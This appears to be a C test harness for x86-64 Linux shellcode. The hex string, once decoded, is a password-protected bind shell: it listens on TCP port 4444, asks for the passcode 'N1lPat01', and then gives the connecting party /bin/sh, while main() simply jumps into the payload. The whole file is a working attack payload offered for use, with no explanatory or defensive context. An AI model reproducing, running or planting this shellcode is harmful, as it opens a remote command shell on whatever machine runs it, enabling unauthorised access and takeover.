#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1e\x50\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x70\x61\x73\x73\x63\x6f\x64\x65\x20\x3a\x20\x0a\x48\x31\xc0\x48\x89\xc7\x48\x89\xfe\x48\x89\xf2\x48\x83\xc0\x29\x48\x83\xc7\x02\x48\x83\xc6\x01\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x31\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x32\x48\x83\xc6\x02\x0f\x05\x48\x31\xc0\x48\x83\xc0\x2b\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\x48\x31\xc0\x48\x83\xc0\x03\x0f\x05\x4c\x89\xcf\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x21\x0f\x05\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x21\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x21\x48\x83\xc6\x02\x0f\x05\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x01\x48\x89\xc7\x48\x8d\x35\x27\xff\xff\xff\x48\x83\xc2\x1e\x0f\x05\x48\x31\xc0\x48\x89\xc7\x48\x89\xc2\x48\x89\xe6\x48\x83\xc2\x08\x0f\x05\x48\xb8\x4e\x31\x6c\x50\x61\x74\x30\x31\x48\x89\xf7\x48\xaf\x75\xc3\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
main()
{

        printf("Shellcode Length:  %d\n", (int)strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
